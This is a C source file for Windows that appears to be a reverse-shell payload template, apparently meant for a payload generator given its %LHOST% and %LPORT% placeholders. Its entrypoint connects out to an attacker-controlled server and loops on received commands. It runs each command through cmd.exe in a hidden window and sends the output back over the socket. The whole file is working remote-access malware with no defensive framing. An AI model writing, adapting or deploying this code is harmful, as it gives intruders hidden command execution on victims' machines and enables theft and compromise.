#include <winsock2.h>
#include <windows.h>
#include <shellapi.h>
#include <stdbool.h>
#include <stdio.h>

#include "libc.h"
#include "entrypoint.h"

#pragma comment(lib, "ws2_32.lib")
// UTF16("str") == L"str" # Wide Character String / UTF-16
#define _UTF16(x)   L##x
#define UTF16(x)    _UTF16(x)

// AutoLoader later

void ExecuteCommand(const char* cmd, SOCKET sock) {
    char buffer[4096];
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    SECURITY_ATTRIBUTES sa;
    HANDLE hRead, hWrite;

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    ZeroMemory(&sa, sizeof(sa));

    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return;
    si.cb = sizeof(STARTUPINFO);
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;
    si.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    char cmdLine[512];
    strcpy(cmdLine, "cmd.exe /c ");
    strncat(cmdLine, cmd, sizeof(cmdLine) - strlen(cmdLine) - 1);

    if (CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        CloseHandle(hWrite);
        DWORD bytesRead;
        while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL)) {
            buffer[bytesRead] = '\0';
            send(sock, buffer, bytesRead, 0);
        }
        CloseHandle(hRead);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        const char* err = "Command execution failed.\n";
        send(sock, err, strlen(err), 0);
        CloseHandle(hRead);
        CloseHandle(hWrite);
    }
}

void entrypoint() {
    
    // Initialiser la bibliothèque WinSock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return;
    }

    const char* ip = %LHOST%;  // IP du serveur
    int port = %LPORT%;  // Le port du serveur

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return;
    }

    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    serverAddr.sin_addr.s_addr = inet_addr(ip);

    // Connexion au serveur
    if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return;
    }

    // Boucle pour recevoir des commandes et envoyer la sortie
    char buffer[1024];
    DWORD bytesRead;
    while (1) {
        // Réception de la commande du serveur
        int recvResult = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (recvResult == SOCKET_ERROR || recvResult == 0) {
            break;  // Si une erreur survient ou la connexion est fermée, quitter la boucle
        }

        // Ajouter un caractère de fin de chaîne
        buffer[recvResult] = '\0';

        ExecuteCommand(buffer, sock);
    }

    // Fermer la socket et nettoyer les ressources
    closesocket(sock);
    WSACleanup();
}
